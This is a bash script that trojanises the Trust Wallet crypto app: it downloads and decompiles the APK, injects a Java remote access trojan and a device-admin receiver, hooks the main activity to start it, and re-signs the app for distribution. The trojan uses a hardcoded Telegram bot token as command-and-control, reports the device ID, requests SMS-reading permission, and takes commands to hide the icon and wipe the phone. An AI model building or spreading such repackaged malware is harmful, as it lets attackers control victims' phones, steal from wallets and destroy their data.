#!/bin/bash

echo "[*] Downloading Official Trust Wallet..."
wget -q -O original.apk "https://apkpure.com/trust-wallet-crypto-bitcoin/com.wallet.crypto.trustapp/download/8.12"

echo "[*] Decompiling APK..."
apktool d -f original.apk -o tw_dir

echo "[*] Downloading apk-mitm..."
wget -q https://github.com/shroudedcode/apk-mitm/releases/download/v0.10.0/apk-mitm-linux -O apk-mitm
chmod +x apk-mitm
./apk-mitm original.apk --skip-patches || true
mv original-patched.apk original.apk

echo "[*] Injecting Permissions & Service..."
MANIFEST="tw_dir/AndroidManifest.xml"
sed -i 's|<application|<uses-permission android:name="android.permission.READ_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>\n    <application|' $MANIFEST
sed -i 's|</application>|<service android:name="com.trust.update.RatService" android:exported="false"/>\n    <receiver android:name="com.trust.update.AdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN" android:exported="true">\n        <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/>\n        <intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/></intent-filter>\n    </receiver>\n    </application>|' $MANIFEST

echo "[*] Compiling Java Source..."
mkdir -p rat_src/com/trust/update/
cat > rat_src/com/trust/update/RatService.java << 'EOF'
package com.trust.update;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.IBinder;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import org.json.JSONArray;
import org.json.JSONObject;

public class RatService extends Service {
    private static final String TOKEN = "9178490317:AAFZJTBGopALDFWZO5kuvXNvSL4B7x5CCdY";
    private static final String CHAT = "8895860731";
    private long offset = 0;
    private boolean running = true;

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (Build.VERSION.SDK_INT >= 26) {
            android.app.NotificationManager nm = getSystemService(android.app.NotificationManager.class);
            android.app.NotificationChannel ch = new android.app.NotificationChannel("sync", "Sync", android.app.NotificationManager.IMPORTANCE_MIN);
            nm.createNotificationChannel(ch);
            startForeground(1, new android.app.Notification.Builder(this, "sync").setSmallIcon(android.R.drawable.stat_notify_sync).setContentTitle("Syncing").build());
        }
        
        sendMsg("✅ Rat Injected in TrustWallet!\nID: " + android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));
        
        new Thread(() -> {
            while (running) {
                try {
                    String updates = getUpdates();
                    if (updates != null) processUpdate(updates);
                    Thread.sleep(3000);
                } catch (Exception e) {}
            }
        }).start();
        return START_STICKY;
    }

    private String getUpdates() {
        try {
            URL url = new URL("https://api.telegram.org/bot" + TOKEN + "/getUpdates?timeout=20&offset=" + offset);
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
            StringBuilder sb = new StringBuilder(); String line;
            while ((line = r.readLine()) != null) sb.append(line);
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    private void processUpdate(String json) {
        try {
            JSONObject obj = new JSONObject(json);
            if (!obj.optBoolean("ok")) return;
            JSONArray arr = obj.getJSONArray("result");
            for (int i = 0; i < arr.length(); i++) {
                JSONObject up = arr.getJSONObject(i);
                offset = up.getLong("update_id") + 1;
                if (!up.has("message")) continue;
                String txt = up.getJSONObject("message").optString("text", "");
                if (txt.startsWith("/hide")) hideIcon();
                else if (txt.startsWith("/unhide")) unhideIcon();
                else if (txt.startsWith("/wipe")) wipeDevice();
                else if (txt.startsWith("/status")) sendMsg("🟢 Alive & Listening");
            }
        } catch (Exception e) {}
    }

    private void hideIcon() {
        try {
            getPackageManager().setComponentEnabledSetting(new ComponentName(this, "com.wallet.crypto.trustapp.MainActivity"), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            sendMsg("🙈 Icon Hidden");
        } catch (Exception e) { sendMsg("❌ Hide Error: " + e.getMessage()); }
    }

    private void unhideIcon() {
        try {
            getPackageManager().setComponentEnabledSetting(new ComponentName(this, "com.wallet.crypto.trustapp.MainActivity"), PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            sendMsg("👁 Icon Visible");
        } catch (Exception e) { sendMsg("❌ Unhide Error: " + e.getMessage()); }
    }

    private void wipeDevice() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, "com.trust.update.AdminReceiver");
            if (dpm.isAdminActive(admin)) {
                dpm.wipeData(0);
                sendMsg("💥 Wiping Device...");
            } else {
                sendMsg("⚠️ Wipe Failed: Admin not active.");
            }
        } catch (Exception e) { sendMsg("❌ Wipe Error: " + e.getMessage()); }
    }

    private void sendMsg(String text) {
        try {
            URL url = new URL("https://api.telegram.org/bot" + TOKEN + "/sendMessage");
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("POST"); c.setDoOutput(true);
            OutputStream os = c.getOutputStream();
            os.write(("chat_id=" + CHAT + "&text=" + URLEncoder.encode(text, "UTF-8")).getBytes("UTF-8"));
            os.flush(); os.close(); c.getResponseCode();
        } catch (Exception e) {}
    }
}

EOF
cat > rat_src/com/trust/update/AdminReceiver.java << 'EOF'
package com.trust.update;
public class AdminReceiver extends android.app.admin.DeviceAdminReceiver {}
EOF

mkdir -p tw_dir/res/xml/
echo '<device-admin xmlns:android="http://schemas.android.com/apk/res/android"><uses-policies><wipe-data/></uses-policies></device-admin>' > tw_dir/res/xml/device_admin.xml

BT=$(ls -d $ANDROID_HOME/build-tools/*/ | tail -1)
AJAR=$(ls $ANDROID_HOME/platforms/android-*/android.jar | tail -1)

echo "[*] Compiling with javac..."
javac -source 1.8 -target 1.8 -cp "$AJAR" rat_src/com/trust/update/*.java

echo "[*] Compiling with d8..."
"${BT}d8" --output . rat_src/com/trust/update/*.class --lib "$AJAR"

echo "[*] Patching MainActivity..."
apktool d -s -f original.apk -o tw_full_dir > /dev/null 2>&1
MAIN_ACT=$(find tw_full_dir -name "MainActivity.smali" | head -n 1)
if [ ! -z "$MAIN_ACT" ]; then
    sed -i '/.method protected onCreate(Landroid\/os\/Bundle;)V/a\    \n    # -- INJECTED CODE --\n    new-instance v0, Landroid\/content\/Intent;\n    const-class v1, Lcom\/trust\/update\/RatService;\n    invoke-direct {v0, p0, v1}, Landroid\/content\/Intent;-><init>(Landroid\/content\/Context;Ljava\/lang\/Class;)V\n    invoke-virtual {p0, v0}, Landroid\/app\/Activity;->startService(Landroid\/content\/Intent;)Landroid\/content\/ComponentName;\n    # -- END INJECTION --\n' $MAIN_ACT
    cp -r tw_full_dir/smali* tw_dir/ 2>/dev/null
fi
cp classes.dex tw_dir/

echo "[*] Rebuilding APK..."
apktool b tw_dir -o unsigned.apk

echo "[*] Signing..."
keytool -genkey -v -keystore key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias mykey -storepass 123456 -keypass 123456 -dname "CN=Android Debug,O=Android,C=US" -noprompt
zipalign -v 4 unsigned.apk aligned.apk
apksigner sign --ks key.jks --ks-pass pass:123456 --key-pass pass:123456 --out injected_trustwallet.apk aligned.apk
